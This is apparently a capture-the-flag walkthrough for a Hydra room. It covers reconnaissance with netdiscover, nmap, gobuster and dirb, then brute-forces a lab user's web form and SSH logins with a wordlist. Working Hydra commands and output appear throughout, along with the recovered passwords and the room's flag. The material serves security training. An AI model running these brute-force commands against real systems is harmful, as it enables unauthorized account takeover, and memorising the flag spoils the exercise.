# Hydra

Learn about and use Hydra, a fast network logon cracker, to bruteforce and obtain a website's credentials.

<img width="1159" height="211" alt="image" src="https://github.com/user-attachments/assets/995f741e-7d23-404d-9a72-96a7d86a8079" />

---

# Task 1 - The Introduction Section!

## What do we need for the Black box?

First, we need things like usernames, passwords, hostnames, IP addresses, port numbers, logs, machine names, etc.

## Today, what will we learn from this CTF?

From this CTF task focused on Hydra, you can learn and practice a variety of cybersecurity skills and concepts, including:

### 1. Using Hydra

**Example:**

```bash
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed" -V
```

This command uses Hydra to perform a brute force attack on a website hosted at 192.168.1.1 using the username admin and passwords from the passwords.txt file. It targets the login form located at /login.php and expects a "Login failed" message for failed login attempts.

---

### 2. Brute Force Attacks

Example: During a brute force attack, you typically use a wordlist such as passwords.txt containing commonly used passwords:

```text
123456
password
admin
letmein
qwerty
```

Hydra will sequentially try these passwords. If the correct password is letmein, Hydra will succeed in its attempt.

---

### 3. Web Application Security

Example: Imagine targeting a login form on a website:

```html
<form action="/login.php" method="post">
    <input type="text" name="username" />
    <input type="password" name="password" />
    <input type="submit" value="Login" />
</form>
```

By analyzing this form, you can determine the parameters Hydra needs to use (username and password).

---

### 4. Reconnaissance and Enumeration

Example: You can use Nmap to scan for open ports on a target network:

```bash
nmap -sV 192.168.1.1
```

This command will identify open ports and the services running on them at 192.168.1.1. For example, if the SSH service is running on port 22, you can use Hydra to brute force this service:

```bash
hydra -l root -P passwords.txt 192.168.1.1 ssh
```

---

### 5. Password Security

Example: Many users use weak passwords like password123 or adminadmin. Such weak passwords are easily guessable through brute force attacks. A strong password should include a mix of uppercase and lowercase letters, numbers, and special characters:

```text
S3cur3P@ssw0rd!
```

Passwords like these are much harder to crack through brute force attacks.

---

### 6. Ethical Hacking Practices

Example: Before conducting a penetration test, it's crucial to obtain written permission from the owner of the target system. Once permission is granted, you should define the scope of the test:

**Scope:** Testing only the company's website.

**Methods:** Focusing on password brute forcing and SQL injection tests.

By following these practices, you stay within legal and ethical boundaries, minimizing potential legal issues.

These examples illustrate fundamental concepts and applications you can learn and practice through CTF tasks involving Hydra and brute force attacks.

---

## Related INE Labs

### Attacking HTTP Authentication with Hydra

https://my.ine.com/course/web-application-security-testing-testing-for-common-attacks/17214602-7ce2-4413-bdd2-efc077ca8443/lab/d939f1ee-5619-357f-8b64-1593359f6d62

### SNMP Analysis

https://my.ine.com/course/network-penetration-testing/f185adf5-6349-43b2-8abd-39f2e46ce96c/lab/dfcf24b1-7ec2-47b9-b3d5-e9d96a81a3a4

### NetBIOS Hacking

https://my.ine.com/course/network-penetration-testing/f185adf5-6349-43b2-8abd-39f2e46ce96c/lab/35957ba7-888a-45ad-921d-6883ce40136d

### Password Attacks: Password Spraying

https://my.ine.com/course/security-domain-2-threats-vulnerabilities-mitigations/99780778-63d1-447a-a6f6-337203daf686/lab/81b5c998-81fd-41c2-968a-0b3e7f21e4d2

### Linux Exploitation: Lab 4 - Lateral Movement

https://my.ine.com/course/lateral-movement-pivoting/6c896dc4-3ec3-4989-85db-0124b443cae9/lab/2e470287-0fe6-46a7-aa8b-df098b7de008

### Answer the questions below

> No answer needed

---

# Task 2 - Netdiscover

**Netdiscover** is a tool used to discover IP addresses of devices on a network. It's especially useful for detecting active devices on local networks. This tool uses the ARP protocol to display IP addresses, MAC addresses, and brand information (if available) of devices within a specified IP range.

```bash
sudo netdiscover
```

This is network scanning, specifically for discovering active hosts within a local area network (LAN). It is particularly useful in penetration testing or network troubleshooting to identify active devices on the network.

```bash
arp-scan -l
```

Similar to `sudo netdiscover` syntax.

---

## Basic Usage

### Basic Scan

```bash
netdiscover
```

This performs a basic scan on the default network interface.

---

## Specifying Network Interface

### Specifying Interface

```bash
netdiscover -i eth0
```

This scans using the eth0 interface.

---

## Scanning Specific Network Range

### Specific Network Range

```bash
netdiscover -r 192.168.1.0/24
```

This scans the specified IP range.

---

## Passive Mode

### Passive Mode

```bash
netdiscover -p
```

This performs a passive scan, listening for ARP requests instead of actively sending them.

---

## Active Mode

### Active Mode

```bash
netdiscover -f
```

This performs a fast and active scan, sending ARP requests.

---

## Customizing ARP Request Timing

### Custom Timing

```bash
netdiscover -s 50
```

This sets the delay between ARP requests to 50 milliseconds.

---

## Using a File for Custom MAC Address Vendor List

### Custom MAC Vendor List

```bash
netdiscover -F /path/to/file
```

This uses a custom file for MAC address vendor identification.

---

## Summary

Here are the various formats of netdiscover command with examples:

```bash
# Basic usage
netdiscover

# Specify network interface
netdiscover -i eth0

# Scan specific network range
netdiscover -r 192.168.1.0/24

# Passive mode
netdiscover -p

# Active mode
netdiscover -f

# Custom ARP request timing
netdiscover -s 50

# Custom MAC address vendor list
netdiscover -F /path/to/file

# Maximum verbosity
netdiscover -v

# Custom output format
netdiscover -P -N
```

---

## Combining Options

You can combine these options to suit your specific scanning needs. For example:

```bash
netdiscover -i eth0 -r 192.168.1.0/24 -s 50 -v
```

This command scans the 192.168.1.0/24 network range using the eth0 interface, sets the delay between ARP requests to 50 milliseconds, and increases verbosity.

netdiscover is a useful tool for quickly identifying live hosts on a network, especially in situations where you may not have administrative privileges or need to perform a quick network survey.

### Answer the questions below

> No answer needed

---

# Task 3 - Nmap_full

**nmap** command has various formats and options for different scanning purposes. Here are some examples:

---

## Basic Scanning

### Basic Scan

```bash
nmap 10.10.108.95
```

This performs a basic scan on the target IP.

---

## Port Scanning

### Scanning All Ports

```bash
nmap -p- 10.10.108.95
```

This scans all 65535 ports on the target.

### Scanning Specific Ports

```bash
nmap -p 22,80,443 10.10.108.95
```

This scans only the specified ports (22, 80, 443).

---

## Service and Version Detection

### Service Version Detection

```bash
nmap -sV 10.10.108.95
```

This detects the version of the services running on the open ports.

### Default Scripts

```bash
nmap -sC 10.10.108.95
```

This runs a set of default scripts against the target.

---

## Stealth and Aggressive Scanning

### Stealth Scan

```bash
nmap -sS 10.10.108.95
```

This performs a stealth scan (SYN scan).

### Aggressive Scan

```bash
nmap -A 10.10.108.95
```

This performs an aggressive scan including OS detection, version detection, script scanning, and traceroute.

---

## Timing and Verbosity

### Increasing Verbosity

```bash
nmap -v 10.10.108.95
```

This increases the verbosity level of the scan.

### Maximum Verbosity

```bash
nmap -vvv 10.10.108.95
```

This sets the verbosity level to maximum.

---

## Output Formats

### Saving Output in Normal, XML, and Grepable Formats

```bash
nmap -oA nmap_full 10.10.108.95
```

This saves the output in normal (.nmap), XML (.xml), and grepable (.gnmap) formats with the base name nmap_full.

---

## Combination Scans (Golden Searches)

### Combining Options

```bash
nmap -Pn -p- -sC -sV 10.10.108.95 -vvv -oA nmap_full
```

This command combines several options: disabling ping (-Pn), scanning all ports (-p-), using default scripts (-sC), performing version detection (-sV), setting maximum verbosity (-vvv), and saving the output in multiple formats (-oA nmap_full).

### Answer the questions below

> No answer needed

#  Task 4 – Gobuster

##  Objective

In this task, you will learn how to use **Gobuster** for web enumeration and discovery.

Gobuster is a command-line enumeration tool commonly used during penetration testing. It uses wordlists to discover hidden directories, files, subdomains, virtual hosts, and other web resources.

>  **Important:** Only use Gobuster against systems you own or have permission to test, such as authorized training labs.

---

## 1. Directory Scanning

Directory enumeration can help identify hidden or unlinked directories on a web server.

### Basic Directory Scan

```bash
gobuster dir -u http://10.10.108.95 -w /usr/share/wordlists/dirb/common.txt
```

### Options

| Option | Description |
|--------|-------------|
| `dir` | Directory/file enumeration mode |
| `-u` | Specifies the target URL |
| `-w` | Specifies the wordlist |

Example discoveries may include:

```text
/admin
/images
/uploads
/login
```

---

##  2. Searching for Specific File Extensions

Gobuster can search for files with specific extensions by using the `-x` option.

```bash
gobuster dir -u http://10.10.108.95 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

The `-x` option tells Gobuster to test the specified file extensions.

Example:

```text
/login.php
/index.html
/config.txt
```

---

##  3. Displaying Full URLs

The `-e` option can be used to display expanded/full URLs in the results.

```bash
gobuster dir -u http://10.10.108.95 -w /usr/share/wordlists/dirb/common.txt -e
```

Instead of:

```text
/admin
```

Gobuster can display:

```text
http://10.10.108.95/admin
```

---

##  4. DNS Subdomain Enumeration

Gobuster can attempt to discover subdomains using `dns` mode.

```bash
gobuster dns -d example.com -w /usr/share/wordlists/dns/subdomains.txt
```

### Options

| Option | Description |
|--------|-------------|
| `dns` | DNS enumeration mode |
| `-d` | Specifies the target domain |
| `-w` | Specifies the wordlist |

Example discoveries:

```text
admin.example.com
dev.example.com
mail.example.com
```

---

##  5. Virtual Host Enumeration

Gobuster can also search for virtual hosts.

```bash
gobuster vhost -u http://10.10.108.95 -w /usr/share/wordlists/virtual-hosts.txt
```

Virtual host enumeration can be useful when multiple websites or applications are hosted on the same web server.

---

##  6. URL Fuzzing

Gobuster's `fuzz` mode allows you to replace the `FUZZ` keyword with entries from a wordlist.

```bash
gobuster fuzz -u http://10.10.108.95/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Gobuster replaces:

```text
FUZZ
```

with each entry from the selected wordlist.

---

##  7. Gobuster Help

To see Gobuster's available commands and options:

```bash
gobuster -h
```

You can also view help for a specific mode.

### Directory Mode

```bash
gobuster dir -h
```

### DNS Mode

```bash
gobuster dns -h
```

### Virtual Host Mode

```bash
gobuster vhost -h
```

---

## 📌 Useful Gobuster Options

| Option | Purpose |
|--------|---------|
| `-u` | Specifies the target URL |
| `-w` | Specifies the wordlist |
| `-x` | Searches for specific file extensions |
| `-e` | Displays expanded/full URLs |
| `-t` | Sets the number of concurrent threads |
| `-o` | Saves results to an output file |
| `-q` | Enables quiet mode |
| `-h` | Displays help information |

---

<img width="1153" height="564" alt="image" src="https://github.com/user-attachments/assets/ad4a8bb5-d9ef-404f-9fa5-eca0dd4745c0" />


# Task 5 - Dirb

**Dirb** command has different formats and options. Here are some examples:

---

## Basic Directory Scanning

### Basic Usage

```bash
dirb http://10.10.108.95
```

---

## Using a Custom Wordlist

### Custom Wordlist

```bash
dirb http://10.10.108.95 /path/to/wordlist.txt
```

This command performs the scan using the specified wordlist.

---

## Scanning for Specific File Extensions

### File Extensions

```bash
dirb http://10.10.108.95 -X .php,.html
```

This command only searches for files with the specified extensions.

---

## Scanning Using a Proxy

### Using a Proxy

```bash
dirb http://10.10.108.95 -p http://127.0.0.1:8080
```

This command performs the scan through the specified proxy.

---

## HTTPS Scanning

### HTTPS Support

```bash
dirb https://10.10.108.95
```

This command performs the scan using the HTTPS protocol.

---

## Detailed Output and Reporting

### Detailed Output

```bash
dirb http://10.10.108.95 -v
```

This command provides more detailed output.

### Output to a File

```bash
dirb http://10.10.108.95 -o output.txt
```

This command writes the scan results to the specified file.

---

## Usage Examples

### All Options and Help

```bash
dirb -h
```

This command shows all available options and help for Dirb.

---

## Summary

Dirb is a flexible tool that can be used for various types of scanning and scenarios. With options like specific file extensions, custom wordlists, proxy usage, and HTTPS support, it allows you to apply different methods to discover potential directories and files on the target system.

### Answer the questions below

Update me..

<img width="645" height="632" alt="image" src="https://github.com/user-attachments/assets/eb20f862-7243-4e3f-848c-3339dd058c35" />


# Task 6 - Hydra Introduction

## What is Hydra?

<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/224fc9f8-6a44-40f7-9bbd-2a492fc258d2" />

Hydra is a brute force online password cracking program, a quick system login password “hacking” tool.

Hydra can run through a list and “brute force” some authentication services. Imagine trying to manually guess someone’s password on a particular service (SSH, Web Application Form, FTP or SNMP) - we can use Hydra to run through a password list and speed this process up for us, determining the correct password.

According to its [official repository](https://github.com/vanhauser-thc/thc-hydra), Hydra supports, i.e., has the ability to brute force the following protocols:

> “Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC and XMPP.”

For more information on the options of each protocol in Hydra, you can check the [Kali Hydra tool page](https://en.kali.tools/?p=220).

---

This shows the importance of using a strong password; if your password is common, doesn’t contain special characters and is not above eight characters, it will be prone to be guessed. A one-hundred-million-password list contains common passwords, so when an out-of-the-box application uses an easy password to log in, change it from the default! CCTV cameras and web frameworks often use `admin:password` as the default login credentials, which is obviously not strong enough.

---

## Additional Resource

https://www.stationx.net/how-to-use-hydra/

---

# Hydra-Cheatsheet

https://github.com/frizb/Hydra-Cheatsheet

---

### Answer the questions below

> Read the above and have Hydra at the ready.

<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/40ed4080-b0ce-432c-a633-8ee0faf8dead" />


# Task 7 - Using Hydra!

## Connecting to the Machine

Hydra is already installed on the AttackBox. Start the AttackBox by pressing the `Start AttackBox` button below, which will start the machine in split view. If it is not visible, use the blue **Show Split View** button at the top of the page.

Once done, Click the `Start Lab Machine` button below to deploy the machine attached to this task, then navigate to [http://MACHINE_IP](http://machine_ip/) on the AttackBox *(this machine can take up to 3 minutes to boot).*

---

### Set up your virtual environment

To successfully complete this room, you'll need to set up your virtual environment. This involves starting both your AttackBox (if you're not using your VPN) and Lab Machines, ensuring you're equipped with the necessary tools and access to tackle the challenges ahead.

**Attacker machine**

Status: Off

> Start AttackBox

**Lab machine**

Status: Off

> Start Lab Machine

However, you can check its official repositories if you prefer to use another Linux distribution. For instance, you can install Hydra on an Ubuntu or Fedora system by executing `apt install hydra` or `dnf install hydra`. Furthermore, you can download it from its official [Hydra repository](https://github.com/vanhauser-thc/thc-hydra).

---

## Hydra Commands

The options we pass into Hydra depend on which service (protocol) we’re attacking. For example, if we wanted to brute force FTP with the username being `user` and a password list being `passlist.txt`, we’d use the following command:

```bash
hydra -l user -P passlist.txt ftp://MACHINE_IP
```

For this deployed machine, here are the commands to use Hydra on SSH and a web form (POST method).

---

### SSH

```bash
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
```

| **OptionDescription** |                                        |
| --------------------- | -------------------------------------- |
| `-l`                  | specifies the (SSH) username for login |
| `-P`                  | indicates a list of passwords          |
| `-t`                  | sets the number of threads to spawn    |

For example,

```bash
hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh
```

will run with the following arguments:

- Hydra will use `root` as the username for `ssh`
- It will try the passwords in the `passwords.txt` file
- There will be four threads running in parallel as indicated by `-t 4`

---

### Post Web Form

We can use Hydra to brute force web forms, too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your browser’s network tab (in developer tools) to see the request types or view the source code.

```bash
sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
```

| **OptionDescription** |                                                                                          |
| --------------------- | ---------------------------------------------------------------------------------------- |
| `-l`                  | the username for (web form) login                                                        |
| `-P`                  | the password list to use                                                                 |
| `http-post-form`      | The type of the form is POST                                                             |
| `<path>`              | the login page URL, for example, `login.php`                                             |
| `<login_credentials>` | the username and password used to log in, for example, `username=^USER^&password=^PASS^` |
| `<invalid_response>`  | part of the response when the login fails                                                |
| `-V`                  | verbose output for every attempt                                                         |

Below is a more concrete example Hydra command to brute force a POST login form:

```bash
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

- The login page is only `/`, i.e., the main IP address.
- The `username` is the form field where the username is entered
- The specified username(s) will replace `^USER^`
- The `password` is the form field where the password is entered
- The provided passwords will be replacing `^PASS^`
- Finally, `F=incorrect` is a string that appears in the server reply when the login fails

On a side note, if the web server is listening on a non-default port number, you can explicitly specify the port number using `-s <port>`, for example:

```bash
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V
```

You should now have enough information to put this into practice and brute-force your credentials on the deployed machine!

---

### Answer the questions below

> Use Hydra to brute-force molly's web password. What is the value of flag 1?

**Check**

> Use Hydra to brute-force molly's SSH password. What is the value of flag 2?


# Flag 1

## Use Hydra to bruteforce molly's **web** password. What is flag 1?

When you see the word 'web', you should go to **dirb or gobuster** and check if there is a login or logout. If there is a login, we can find the user's password and password using hydra.

The wordlist location I provided here is a default wordlist found within Linux, located at `/usr/share/wordlist/rockyou.txt`. You can choose to use your own wordlist or other wordlists available on the internet.

```bash
root@ip-10-10-181-114:~# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.129.197 http-post-form "/login\:username=^USER^&password=^PASS^\:F=incorrect"
```

As a result of this attempt, we get output like the following and determine that the password is `sunshine`.

We log in using this information.

After logging in, we reach the first flag as in the image.

```bash
root@ip-10-10-181-114:~# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.129.197 http-post-form "/login\:username=^USER^&password=^PASS^\:F=incorrect"

Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2024-07-08 22:15:20

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task

[DATA] attacking http-post-form://10.10.129.197:80//login\:username=^USER^&password=^PASS^\:F=incorrect

[80][http-post-form] host: 10.10.129.197 login: molly password: **sunshine**

1 of 1 target successfully completed, 1 valid password found
```
We log in using this information.

<img width="768" height="466" alt="image" src="https://github.com/user-attachments/assets/ad5ccd62-d28e-4814-9194-c1e749c93442" />

After logging in, we reach the first flag as in the image.

<img width="768" height="114" alt="image" src="https://github.com/user-attachments/assets/4b83e9ec-b01f-4a97-9060-1253d7f690fb" />

root@ip-10-10-181-114:~# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.129.197 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2024-07-08 22:15:20
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://10.10.129.197:80//login:username=^USER^&password=^PASS^:F=incorrect
[80][http-post-form] host: 10.10.129.197 login: molly password: sunshine
1 of 1 target successfully completed, 1 valid password found

<img width="1891" height="266" alt="image" src="https://github.com/user-attachments/assets/7d7392c3-0b83-40bd-8538-e1e770d829f0" />

<img width="1914" height="804" alt="image" src="https://github.com/user-attachments/assets/6ec46874-f4a1-4d28-8e00-b9158b0d97c2" />

# Flag 2

## Use Hydra to brute-force molly's SSH password. What is flag 2?

In the second question, we need to access the SSH password of the “molly” user. For this we use the following command:

```bash
root@ip-10-10-181-114:~# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.129.197 -t 4 ssh
```
<img width="1024" height="350" alt="image" src="https://github.com/user-attachments/assets/9c5a545a-4a4a-474f-8ee0-7d4fa9b62b12" />

```text
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
```

Here we saw that the password is `butterfly`.

**Here we make the SSH connection and enter the password we found. Then we access the 2nd flag in flag2.txt.**

```bash
root@ip-10-10-181-114:~# ssh molly@10.10.129.197

The authenticity of host '10.10.129.197 (10.10.129.197)' can't be established.
ECDSA key fingerprint is SHA256:HZj7jdeYLKx2/JrlLSW1xZqyPmQdEbFesfrQ0cU8e6s.
Are you sure you want to continue connecting (yes/no)? yes

Warning: Permanently added '10.10.129.197' (ECDSA) to the list of known hosts.
molly@10.10.129.197's password:

Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64)

- Documentation: https://help.ubuntu.com
- Management: https://landscape.canonical.com
- Support: https://ubuntu.com/advantage

65 packages can be updated.
32 updates are security updates.

Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98

molly@ip-10-10-129-197:~$ ls
flag2.txt

molly@ip-10-10-129-197:~$ cat flag2.txt
THM{c8eeb0468febbadea859baeb33b2541b}

molly@ip-10-10-129-197:~$ whoami
molly
```
<img width="849" height="547" alt="image" src="https://github.com/user-attachments/assets/3d15bbef-5a2d-4819-9815-20266d7a650d" />

















